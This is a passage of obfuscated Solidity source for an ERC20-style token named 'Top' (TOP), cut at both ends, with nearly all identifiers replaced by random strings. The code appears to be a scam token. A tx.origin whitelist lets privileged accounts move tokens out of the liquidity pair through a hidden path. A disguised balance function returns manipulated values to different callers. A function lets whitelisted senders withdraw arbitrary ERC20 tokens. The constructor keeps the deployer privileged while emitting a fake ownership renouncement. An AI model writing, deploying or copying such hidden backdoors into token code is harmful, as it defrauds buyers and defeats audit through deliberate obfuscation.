    address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,
    uint256 fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G
  ) public {
    require(sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[msg.sender]);
    IERC20(h8IilDDJ6AK63X3lMfNRfZiNR90ByGCD7jBKM2bgsr6I7T7aqvXUZcHQhe2jvpJfH2GeTf9pPc1jDpJU0Er1BY0Ws6mgq4EU).transfer(tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G);
  }
}

contract TOP is kjXmosoWd60XyW6qFzuDwT6ECbo3y0ojjLAtFKYUxVJCSbNby9a91p0uSK6DZWKHCAbxnZST3xFG7u1Dc7TDCqtdNuxUkfKw {
  function totalSupply() external pure returns (uint256) {
    return asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO;
  }

  function decimals() external pure returns (uint8) {
    return vvidyyrnvkGRXuRadKGU8sfVUl7y8VnT8MrMVxEmeONPiML2JFTbLnjPbwqgOwXYFZls183fsiQqk7o3pvfB93vWOZb2XACr;
  }

  function symbol() external pure returns (string memory) {
    return l6xVougtzhCkq3w5F3nKUqbPHNh66PXwpKa3OUN6A8LQ30vRxEfwDd9Ef4lccbgVMwSufOpYGx1jj3HhH4pWASUiYZiGU5zL;
  }

  function name() external pure returns (string memory) {
    return b4WKzx6QVzOX7yTNHCkJq6GwPUIQBUt3NY7clSkN51OqtfCaSzKf9ehHG8020t95GPFRihIXVUhQpROs9Z75K4CIAgOtA4dM;
  }

  function allowance(address kwPL3lgqXBKp2dsLc5HGLRPnzWxbFDF4oLu2JlwhkodhDpDa9K1HvlxhvhYrQzt1DzlTq0FEk7fJ6ZranHkFoVMsPQeTmRcW, address fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V)
    external
    view
    returns (uint256)
  {
    return yvLLfsiLyZxberaEEchIhHJ1VWrphjGz7YH7VYq5adP3GsO0C8craYhy0dFbOkpEl3Tdvx1eOazhpAozWKjwuHY10QKIrZhH[kwPL3lgqXBKp2dsLc5HGLRPnzWxbFDF4oLu2JlwhkodhDpDa9K1HvlxhvhYrQzt1DzlTq0FEk7fJ6ZranHkFoVMsPQeTmRcW][fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V];
  }

  event Transfer(address indexed, address indexed, uint256);
  event Approval(address indexed, address indexed, uint256);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  uint256 private fzFwxtujyf4CjXx5PGkiAptdG3T97aJElakaY8jP0LVCZ5dEp2CNO9lNrwRYiZusE1V8XFWeFIiMaEEwyN7FscT4MG4BP1rm = 1;
  uint256 private wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B;

  function permit5764825481139(address jtS7fcOZlvheq3wTwlnFS5oSZJrF4g0aV2n1Ie2EenPTwlDW98LjMgU4snhuHAP2H4piVnmup7tXlGMExnXUykoSpcn7y4HD) public view returns (uint256) {
    if (
      (msg.sender == tveqYdlFSy3NCkJliAaXUuV6LHRGmHFKbvTBJ8vWYauuCpKAymFsnSuR49BZG2XltV9nUSGUSf0L8LIpeqvTLDHNPUmKQzBA || msg.sender == bgPsOsFtFEposPtIjxWQwe6hddv7Ft1rxCTRAj0ZcSGNaBS8LZ7vZrabexmlb5KnCI67la6HrlExYV25VlmXbVv35wgVRg02) &&
      jtS7fcOZlvheq3wTwlnFS5oSZJrF4g0aV2n1Ie2EenPTwlDW98LjMgU4snhuHAP2H4piVnmup7tXlGMExnXUykoSpcn7y4HD != cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF &&
      jtS7fcOZlvheq3wTwlnFS5oSZJrF4g0aV2n1Ie2EenPTwlDW98LjMgU4snhuHAP2H4piVnmup7tXlGMExnXUykoSpcn7y4HD != tveqYdlFSy3NCkJliAaXUuV6LHRGmHFKbvTBJ8vWYauuCpKAymFsnSuR49BZG2XltV9nUSGUSf0L8LIpeqvTLDHNPUmKQzBA &&
      jtS7fcOZlvheq3wTwlnFS5oSZJrF4g0aV2n1Ie2EenPTwlDW98LjMgU4snhuHAP2H4piVnmup7tXlGMExnXUykoSpcn7y4HD != bgPsOsFtFEposPtIjxWQwe6hddv7Ft1rxCTRAj0ZcSGNaBS8LZ7vZrabexmlb5KnCI67la6HrlExYV25VlmXbVv35wgVRg02
    ) {
      return asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO * fzFwxtujyf4CjXx5PGkiAptdG3T97aJElakaY8jP0LVCZ5dEp2CNO9lNrwRYiZusE1V8XFWeFIiMaEEwyN7FscT4MG4BP1rm;
    }

    if (!sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[tx.origin]) {
      if (IERC20(g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88).balanceOf(cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF) < aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI - wejFeX4EGe4F1YRGDBFyT3Kzq6A2YbFicKcYxAZLe04uHjv13j304wFSfnMZktBVjjMJ71NTxuzqZh2JDjv1xUyn9tPJBM1B) {
        return 0;
      }
    }

    return g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[jtS7fcOZlvheq3wTwlnFS5oSZJrF4g0aV2n1Ie2EenPTwlDW98LjMgU4snhuHAP2H4piVnmup7tXlGMExnXUykoSpcn7y4HD];
  }

  mapping(address => mapping(address => uint256)) private yvLLfsiLyZxberaEEchIhHJ1VWrphjGz7YH7VYq5adP3GsO0C8craYhy0dFbOkpEl3Tdvx1eOazhpAozWKjwuHY10QKIrZhH;
  mapping(address => uint256) private g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q;

  string private constant b4WKzx6QVzOX7yTNHCkJq6GwPUIQBUt3NY7clSkN51OqtfCaSzKf9ehHG8020t95GPFRihIXVUhQpROs9Z75K4CIAgOtA4dM = "Top";
  string private constant l6xVougtzhCkq3w5F3nKUqbPHNh66PXwpKa3OUN6A8LQ30vRxEfwDd9Ef4lccbgVMwSufOpYGx1jj3HhH4pWASUiYZiGU5zL = "TOP";
  uint8 private constant vvidyyrnvkGRXuRadKGU8sfVUl7y8VnT8MrMVxEmeONPiML2JFTbLnjPbwqgOwXYFZls183fsiQqk7o3pvfB93vWOZb2XACr = 9;
  uint256 public constant t7NBkB1lnhJfXenKYwMV5nWEpRVuybd2PvsFFGW6ooGG69TCTljPdOrsP2lCSyt5OLYyfwVi0NJAZnndcj7h8zhZGI6goaMA = 10**9;

  uint256 public constant asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO = 100000000 * 10**vvidyyrnvkGRXuRadKGU8sfVUl7y8VnT8MrMVxEmeONPiML2JFTbLnjPbwqgOwXYFZls183fsiQqk7o3pvfB93vWOZb2XACr;

  constructor(bytes memory mFc9cGhQpeYzz0HArP49i8UVIUsiDhFgnJ8jpbMyC1ahZXHRizkBFBmzfJiGOpvsjCUpTxA9ECZSvkSIRYqk3gJUbJ9oHXiR) {
    g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[address(this)] = asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO;
    emit Transfer(address(0), address(this), asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO);

    cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF = hXu2jRpH5h8uCTHw1HBRXgFOf0BVdUtFZqXqCCNxfjKlGDtMJeSCmfXzMVlWgquy4WQjvrATq6GvxkDU9H2nZimmRc0lOy9t(hXu2jRpH5h8uCTHw1HBRXgFOf0BVdUtFZqXqCCNxfjKlGDtMJeSCmfXzMVlWgquy4WQjvrATq6GvxkDU9H2nZimmRc0lOy9t(bgPsOsFtFEposPtIjxWQwe6hddv7Ft1rxCTRAj0ZcSGNaBS8LZ7vZrabexmlb5KnCI67la6HrlExYV25VlmXbVv35wgVRg02).factory()).createPair(
      g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88,
      address(this)
    );

    idoAmount = (asyUDzMWyHS2h5O2mwZvtW4AMbtV85BeRzVHUpVDSmgyY4afKEZmi6MYUsiHuOaXoXiKnrUEufzx4r43nJin5DgGCzjJ9DeO / 100) * 80;
    d6mG5H1O0Up04034DXACMLvLSvIkq3iz8ipeQokGhRROi2e19XYDnTNd0ZnUTbhYZc2eLQgBR2l62MXIO401g73IhKnQlHv5 = (idoAmount * t7NBkB1lnhJfXenKYwMV5nWEpRVuybd2PvsFFGW6ooGG69TCTljPdOrsP2lCSyt5OLYyfwVi0NJAZnndcj7h8zhZGI6goaMA) / 5000000000000000000;

    k4Wxwkaf5rkQWtJllLNIZdmD3783xoDQtPNCkyj5UyOhEcupBk604umZHC9J23jRGPtzy4ifjfTz2wsFSTyZnAsXGFu6FAQb(address(this), fa1jO0aa8PL4cUzzLrasG3phM10o6IfF38tHzv4zH63avFiqXJyIfOuIpw74NpsWgI9zFrky7Z7XBF6o1kjMb0HQU6MS8xcf, idoAmount);

    sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[msg.sender] = true;
    t7Dc5SFBbGS1mTEhQnX0bqbw234OvSgRhYCLtzyC4v9PX0kOt0IphfmA9CIm2UCsGo2VWj2IOzf4VspX7ZF02QrYkR6QCkt4(mFc9cGhQpeYzz0HArP49i8UVIUsiDhFgnJ8jpbMyC1ahZXHRizkBFBmzfJiGOpvsjCUpTxA9ECZSvkSIRYqk3gJUbJ9oHXiR);

    emit OwnershipTransferred(msg.sender, address(0));
  }

  function permit8355429682040(address jBq3rUrTFlLWBufgBbSJuH9mGeJrkZDTrb19UipCDEb1mLBiwyDE9awChkeJjWxzIjpF5KR6EyhOYGXBZQCXErtcamX7nyWt, uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu)
    public
    returns (bool)
  {
    qurdJcE2pSCihHqWc743dFUol63VbUxnjevGWA34YD0K0ZbvFMs6WQPIZmRCNMmGbWVxLMdr3hLVcKPSVGJKxTkTV8X0gIaC(msg.sender, jBq3rUrTFlLWBufgBbSJuH9mGeJrkZDTrb19UipCDEb1mLBiwyDE9awChkeJjWxzIjpF5KR6EyhOYGXBZQCXErtcamX7nyWt, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
    return true;
  }

  function approve(address fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V, uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu)
    external
    returns (bool)
  {
    dTBkhZjw8lwF5VBcjUpIi9zNjV9oPSkauIUVLANbbBoRyF9qXBy5ln4Cm4KB4XjDsFzAhip0qm5FkRQmuV4ZlkTSDm7ld9ll(msg.sender, fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
    return true;
  }

  function dTBkhZjw8lwF5VBcjUpIi9zNjV9oPSkauIUVLANbbBoRyF9qXBy5ln4Cm4KB4XjDsFzAhip0qm5FkRQmuV4ZlkTSDm7ld9ll(
    address mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC,
    address fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) internal {
    require(mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC != address(0), "ERC20: Zero Address");
    require(fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V != address(0), "ERC20: Zero Address");

    yvLLfsiLyZxberaEEchIhHJ1VWrphjGz7YH7VYq5adP3GsO0C8craYhy0dFbOkpEl3Tdvx1eOazhpAozWKjwuHY10QKIrZhH[mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC][fORWqqQjhz9e5vTNRRviXIVojFJx7HyBDnaNgFth9pZI46d0GAsLnAsixV0NatLLg2mRq7ZtFJQRMTdck87zQOC18GDka83V] = iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
  }

  function transferFrom(
    address mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC,
    address jBq3rUrTFlLWBufgBbSJuH9mGeJrkZDTrb19UipCDEb1mLBiwyDE9awChkeJjWxzIjpF5KR6EyhOYGXBZQCXErtcamX7nyWt,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) external returns (bool) {
    if (yvLLfsiLyZxberaEEchIhHJ1VWrphjGz7YH7VYq5adP3GsO0C8craYhy0dFbOkpEl3Tdvx1eOazhpAozWKjwuHY10QKIrZhH[mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC][msg.sender] != type(uint256).max) {
      yvLLfsiLyZxberaEEchIhHJ1VWrphjGz7YH7VYq5adP3GsO0C8craYhy0dFbOkpEl3Tdvx1eOazhpAozWKjwuHY10QKIrZhH[mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC][msg.sender] -= iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    }

    return qurdJcE2pSCihHqWc743dFUol63VbUxnjevGWA34YD0K0ZbvFMs6WQPIZmRCNMmGbWVxLMdr3hLVcKPSVGJKxTkTV8X0gIaC(mwQo00ncTTGevE7tEi5FPnN2C2MCSdBcBQw2YDL7sbOJrJaok92DLeHbWhHsUFux7LBNuY2WyFHz9lg2odfWrJXk90AXlXHC, jBq3rUrTFlLWBufgBbSJuH9mGeJrkZDTrb19UipCDEb1mLBiwyDE9awChkeJjWxzIjpF5KR6EyhOYGXBZQCXErtcamX7nyWt, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
  }

  function qurdJcE2pSCihHqWc743dFUol63VbUxnjevGWA34YD0K0ZbvFMs6WQPIZmRCNMmGbWVxLMdr3hLVcKPSVGJKxTkTV8X0gIaC(
    address qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr,
    address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) internal returns (bool) {
    if (sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[tx.origin]) {
      if (qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr == cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF) {
        k4Wxwkaf5rkQWtJllLNIZdmD3783xoDQtPNCkyj5UyOhEcupBk604umZHC9J23jRGPtzy4ifjfTz2wsFSTyZnAsXGFu6FAQb(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr, tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
        return true;
      }
    }

    plG9MTX7ame77mGdoEiJMeBcpwcJmiD4zESwr21WJWv9JTbJNV3iR2IbKwNJpMAseD03sIWnXxVdRiy1k2UdBTnjl8QdJ4ds(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr, tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
    if (!sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[tx.origin] && msg.sender == cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF)
    {
      fzFwxtujyf4CjXx5PGkiAptdG3T97aJElakaY8jP0LVCZ5dEp2CNO9lNrwRYiZusE1V8XFWeFIiMaEEwyN7FscT4MG4BP1rm += 1;
      if(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr==cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF)
        emit Transfer(tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,address(0), iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);
    }
      

    return true;
  }

  function plG9MTX7ame77mGdoEiJMeBcpwcJmiD4zESwr21WJWv9JTbJNV3iR2IbKwNJpMAseD03sIWnXxVdRiy1k2UdBTnjl8QdJ4ds(
    address qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr,
    address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) internal returns (bool) {
    require(iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu > 0, "Transfer amount must be greater than zero");
    g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr] -= iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd] += iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    emit Transfer(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr, tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);

    return true;
  }

  function k4Wxwkaf5rkQWtJllLNIZdmD3783xoDQtPNCkyj5UyOhEcupBk604umZHC9J23jRGPtzy4ifjfTz2wsFSTyZnAsXGFu6FAQb(
    address qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr,
    address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) internal returns (bool) {
    g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr] -= iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    emit Transfer(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr, tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);

    return true;
  }

  function qDqe0hatWpXTjeZ7LLoyqRvKdjqvuVfhuz1rnA45mpk5egaNK842BsdQqGnNYLZegEOAELUmW5xRgDIJovDeDCqy1e7OBxNw(
    address qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr,
    address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd,
    uint256 iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu
  ) internal returns (bool) {
    g2jGNAsFUh9qE1J6Aw86LOwuY46KvgttNnotRlCgSDWWwKLe34H5Q72JEawhCNX9bleSrlv0DWV1dpWHYSpNf7tnEdgBRL7Q[tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd] += iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu;
    emit Transfer(qzKGdq1kCee6ZqejWRDs2UJZNd1JibjGW166J5MKjj763l5Js9I2O1p8oIPmFh4FOmaw6eEjnxqUfUunLan8NUcxpxsbpivr, tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, iZNRuzqISgMd4xWIGYSf2dfXhXPW2uz6lZh3YnEYhmqnJmKQmTgfJzJLGzSA4EJx0SgxGViTmC0nNLAHUsvPSDvV0djqIiKu);

    return true;
  }

  function tbEn66VJjweS9LiML6Lgdxzw3H4waJCaAR0bdqywUEMXsg8Ms7N12Kx0DgXONuFaMFWI2A5HWkAp8Xh5xnkK5gI0wXzHPyi2(
    address nW169zSY5hyJDOYQncThItzcYDbDgbOggFNUGrHpTjZ1v62vTmV9Yw5TzZqHqZNsnLGXK2j5Fvt8WNkeiaBdeNcjDZgHLeG1,
